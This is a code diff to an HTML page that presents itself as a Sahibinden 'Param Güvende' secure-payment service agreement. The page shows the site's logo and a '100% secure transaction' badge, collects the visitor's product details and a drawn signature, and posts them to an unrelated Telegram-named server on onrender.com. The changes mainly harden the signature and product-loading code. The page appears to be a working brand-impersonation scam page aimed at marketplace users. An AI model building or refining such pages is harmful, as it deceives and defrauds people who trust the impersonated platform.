@@ -93,8 +93,8 @@ body {
     width:100%;
     border-radius:10px;
     margin-bottom:8px;
-    display:block;
-    background:#f3f4f6;
+    background:#fff;
+    display:none;
 }
 
 /* SIGNATURE */
@@ -142,7 +142,7 @@ button {
 <!-- HEADER -->
 <div class="header">
     <div class="header-center">
-        <img src="https://upload.wikimedia.org/wikipedia/tr/archive/5/51/20121213095814%21Sahibinden-2010-200px.jpg" class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/tr/archive/5/51/20121213095814%21Sahibinden-2010-200px.jpg" class="logo" alt="Logo">
         <div class="sub">Param Güvende Hizmet Sözleşmesi</div>
         <div class="secure-badge">🔒 %100 Güvenli İşlem</div>
     </div>
@@ -154,12 +154,12 @@ button {
 🛡️ Bu işlem, ödeme güvenliği sağlamak amacıyla platform güvencesi altında yürütülmektedir.
 </div>
 
-<!-- ÜRÜN BİLGİSİ EKLENDİ -->
+<!-- ÜRÜN BİLGİSİ -->
 <div class="card">
-    <div class="title">Ürün Bilgisi</div>
-    <img id="pimg" class="product-img" alt="Ürün resmi">
-    <div class="text" id="pname">Ürün yükleniyor...</div>
-    <div class="text" id="pprice"></div>
+<div class="title">Ürün Bilgisi</div>
+<img id="pimg" class="product-img" alt="Ürün resmi">
+<div class="text" id="pname">Ürün yükleniyor...</div>
+<div class="text" id="pprice"></div>
 </div>
 
 <div class="card">
@@ -243,20 +243,37 @@ Bu sözleşme elektronik ortamda onaylanarak yürürlüğe girer ve kayıtlar de
 <script src="https://cdn.jsdelivr.net/npm/signature_pad@4.0.0/dist/signature_pad.umd.min.js"></script>
 
 <script>
+let pad = null;
 const canvas = document.getElementById("pad");
-const pad = new SignaturePad(canvas);
 
 function resize(){
- let ratio = Math.max(window.devicePixelRatio,1);
- canvas.width = canvas.offsetWidth * ratio;
- canvas.height = canvas.offsetHeight * ratio;
- canvas.getContext("2d").scale(ratio,ratio);
+  const ratio = Math.max(window.devicePixelRatio || 1, 1);
+  canvas.width = canvas.offsetWidth * ratio;
+  canvas.height = canvas.offsetHeight * ratio;
+  canvas.getContext("2d").scale(ratio, ratio);
+  if (pad) {
+    pad.clear();
+  }
 }
-resize();
-window.onresize = resize;
+
+function initSignature(){
+  try {
+    if (typeof SignaturePad === "undefined") {
+      console.error("SignaturePad yüklenmedi");
+      return;
+    }
+    pad = new SignaturePad(canvas);
+    resize();
+    window.onresize = resize;
+  } catch (err) {
+    console.error("İmza alanı başlatılamadı:", err);
+  }
+}
 
 function clearPad(){
- pad.clear();
+  if (pad) {
+    pad.clear();
+  }
 }
 
 async function loadProduct(){
@@ -272,53 +289,68 @@ async function loadProduct(){
     const d = await response.json();
 
     document.getElementById("pname").innerText = "Ürün Adı: " + (d.name || "-");
-    document.getElementById("pprice").innerText = "Ürün Fiyatı: " + (d.price || "-") + " ₺";
-    document.getElementById("pimg").src = d.image || "";
+    document.getElementById("pprice").innerText = "Ürün Fiyatı: " + (d.price || "-");
+
+    if (d.image) {
+      const pimg = document.getElementById("pimg");
+      pimg.src = d.image;
+      pimg.style.display = "block";
+    } else {
+      document.getElementById("pimg").style.display = "none";
+    }
   } catch (err) {
+    console.error("Ürün yükleme hatası:", err);
     document.getElementById("pname").innerText = "Ürün bilgisi yüklenemedi";
     document.getElementById("pprice").innerText = "";
-    console.error(err);
+    document.getElementById("pimg").style.display = "none";
+  }
+}
+
+async function send(){
+  if(!document.getElementById("check").checked){
+    alert("Sözleşmeyi kabul etmelisiniz");
+    return;
+  }
+
+  if(!pad){
+    alert("İmza alanı yüklenemedi");
+    return;
+  }
+
+  if(pad.isEmpty()){
+    alert("İmza gereklidir");
+    return;
+  }
+
+  const data = pad.toDataURL();
+
+  try {
+    const response = await fetch("https://telegram-product-system.onrender.com/submit", {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({
+        signature: data,
+        product:{
+          name: document.getElementById("pname").innerText,
+          price: document.getElementById("pprice").innerText,
+          image: document.getElementById("pimg").src
+        }
+      })
+    });
+
+    if (!response.ok) {
+      throw new Error("Gönderim başarısız");
+    }
+
+    alert("Sözleşme başarıyla gönderildi");
+  } catch (err) {
+    console.error("Gönderim hatası:", err);
+    alert("Gönderim sırasında hata oluştu");
   }
 }
 
 loadProduct();
-
-async function send(){
- if(!document.getElementById("check").checked){
-   alert("Sözleşmeyi kabul etmelisiniz");
-   return;
- }
- if(pad.isEmpty()){
-   alert("İmza gereklidir");
-   return;
- }
-
- const data = pad.toDataURL();
-
- try {
-   const response = await fetch("https://telegram-product-system.onrender.com/submit", {
-     method:"POST",
-     headers:{"Content-Type":"application/json"},
-     body: JSON.stringify({
-       signature: data,
-       product:{
-         name: document.getElementById("pname").innerText,
-         price: document.getElementById("pprice").innerText,
-         image: document.getElementById("pimg").src
-       }
-     })
-   });
-
-   if (!response.ok) {
-     throw new Error("Gönderim başarısız");
-   }
-
-   alert("Sözleşme başarıyla gönderildi");
- } catch (err) {
-   console.error(err);
-   alert("Gönderim sırasında hata oluştu");
- }
-}
+initSignature();
 </script>
 
 </body>
